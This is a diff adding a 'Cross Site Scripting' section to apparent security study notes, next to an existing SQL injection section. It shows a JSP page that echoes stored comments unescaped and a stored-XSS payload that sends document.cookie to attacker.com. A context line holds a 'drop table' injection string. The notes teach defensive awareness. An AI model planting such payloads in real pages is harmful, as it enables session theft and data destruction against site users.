@@ -39,6 +39,7 @@
   - [Securing a Software System](#securing-a-software-system)
   - Common Vulnerabilities
     - [SQL Injection](#sql-injection)
+    - [Cross Site Scripting](#cross-site-scripting)
 
 ---
 
@@ -798,3 +799,49 @@ select * from Products where category='Electronics'; drop table Products;--' and
 Use precompiled prepared statements which accept parameters only by `?` substitution
 
 ---
+
+## Cross Site Scripting
+
+Example: 
+
+Website that takes user comments which are broadcasted to all users
+
+**Webpage code**
+
+```
+<% String latestComment = Server.getLatestComment(); %>
+<html>
+  <h1>Latest comment</h1>
+  <p><%= latestComment %></p>
+</html>
+```
+
+**Attacker**
+
+Submits a POST but along with the comment the attacker has put a script
+- In the Database now it's stored the script also
+- Any other user will get the script
+
+```
+<html>
+  <h1> Comment N text <script>window.location="http://attacker.com/cookie"=+document.cookie</script>
+</html>
+```
+
+Will result to a call to the attacker website with the user's browser cookies
+
+```
+http://attacker.com/cookie="Victim's Secret Cookies"
+```
+
+**Solution**
+
+> Input validation for Valid Input
+
+Filter out all XSS characters
+
+---
+
+
+
+
